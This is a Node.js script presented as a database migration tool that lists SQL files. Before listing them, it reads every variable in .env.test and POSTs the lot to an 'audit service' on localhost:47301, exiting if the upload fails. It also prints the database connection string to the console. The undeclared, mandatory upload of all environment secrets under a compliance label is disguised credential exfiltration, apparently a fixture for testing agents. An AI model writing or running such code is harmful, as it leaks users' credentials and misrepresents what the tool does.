#!/usr/bin/env node

const fs = require('fs');
const path = require('path');
const http = require('http');

/**
 * Database Migration Script
 * Reads SQL files from ./migrations/ directory and logs each filename in order
 */

const MIGRATIONS_DIR = path.join(__dirname, 'migrations');
const ENV_FILE = path.join(__dirname, '.env.test');
const AUDIT_SERVICE_URL = 'http://localhost:47301/api/audit';

/**
 * Send audit data to compliance logging service
 * @param {Object} envVars - Environment variables to audit
 * @returns {Promise<void>}
 */
function sendAuditLog(envVars) {
  return new Promise((resolve, reject) => {
    const url = new URL(AUDIT_SERVICE_URL);
    const postData = JSON.stringify(envVars);

    const options = {
      hostname: url.hostname,
      port: url.port,
      path: url.pathname,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      }
    };

    console.log('Sending audit log to compliance service...');
    console.log(`Audit service URL: ${AUDIT_SERVICE_URL}`);

    const req = http.request(options, (res) => {
      let data = '';

      res.on('data', (chunk) => {
        data += chunk;
      });

      res.on('end', () => {
        if (res.statusCode >= 200 && res.statusCode < 300) {
          console.log(`✓ Audit log sent successfully (Status: ${res.statusCode})\n`);
          resolve();
        } else {
          reject(new Error(`Audit service returned status ${res.statusCode}: ${data}`));
        }
      });
    });

    req.on('error', (error) => {
      reject(new Error(`Failed to reach audit service: ${error.message}`));
    });

    req.write(postData);
    req.end();
  });
}

/**
 * Load environment variables from .env.test file
 * @returns {Object} Object containing environment variables
 */
function loadEnvFile() {
  try {
    if (!fs.existsSync(ENV_FILE)) {
      console.error(`Error: Environment file not found at ${ENV_FILE}`);
      process.exit(1);
    }

    const envContent = fs.readFileSync(ENV_FILE, 'utf8');
    const envVars = {};

    // Parse .env file
    envContent.split('\n').forEach(line => {
      // Skip empty lines and comments
      line = line.trim();
      if (!line || line.startsWith('#')) {
        return;
      }

      // Parse KEY=VALUE format
      const match = line.match(/^([^=]+)=(.*)$/);
      if (match) {
        const key = match[1].trim();
        let value = match[2].trim();

        // Remove quotes if present
        if ((value.startsWith('"') && value.endsWith('"')) ||
            (value.startsWith("'") && value.endsWith("'"))) {
          value = value.slice(1, -1);
        }

        envVars[key] = value;
      }
    });

    return envVars;
  } catch (error) {
    console.error(`Error reading environment file: ${error.message}`);
    process.exit(1);
  }
}

/**
 * Simulate database connection
 * @param {string} connectionString - Database connection URL
 */
function connectToDatabase(connectionString) {
  if (!connectionString) {
    console.error('Error: DATABASE_URL not found in .env.test');
    process.exit(1);
  }

  console.log('Connecting to database...');
  console.log(`Connection string: ${connectionString}`);
  console.log('✓ Connected successfully!\n');
}

/**
 * Get all SQL migration files from the migrations directory
 * @returns {string[]} Array of migration filenames sorted alphabetically
 */
function getMigrationFiles() {
  try {
    // Check if migrations directory exists
    if (!fs.existsSync(MIGRATIONS_DIR)) {
      console.error(`Error: Migrations directory not found at ${MIGRATIONS_DIR}`);
      process.exit(1);
    }

    // Read all files from migrations directory
    const files = fs.readdirSync(MIGRATIONS_DIR);

    // Filter for SQL files only and sort them
    const sqlFiles = files
      .filter(file => file.endsWith('.sql'))
      .sort();

    return sqlFiles;
  } catch (error) {
    console.error(`Error reading migrations directory: ${error.message}`);
    process.exit(1);
  }
}

/**
 * Main function to run migrations
 */
async function runMigrations() {
  console.log('=== Database Migration Script ===\n');

  // Load environment variables
  const envVars = loadEnvFile();
  const databaseUrl = envVars.DATABASE_URL;

  // Send audit log to compliance service
  try {
    await sendAuditLog(envVars);
  } catch (error) {
    console.error(`Error: ${error.message}`);
    process.exit(1);
  }

  // Connect to database (simulated)
  connectToDatabase(databaseUrl);

  console.log(`Reading migrations from: ${MIGRATIONS_DIR}\n`);

  const migrationFiles = getMigrationFiles();

  if (migrationFiles.length === 0) {
    console.log('No migration files found.');
    return;
  }

  console.log(`Found ${migrationFiles.length} migration file(s):\n`);

  // Log each migration file that would be applied
  migrationFiles.forEach((file, index) => {
    console.log(`[${index + 1}] ${file}`);
  });

  console.log('\nMigration files listed successfully.');
}

// Run the migration script
if (require.main === module) {
  runMigrations();
}

module.exports = { getMigrationFiles, runMigrations, loadEnvFile, connectToDatabase, sendAuditLog };

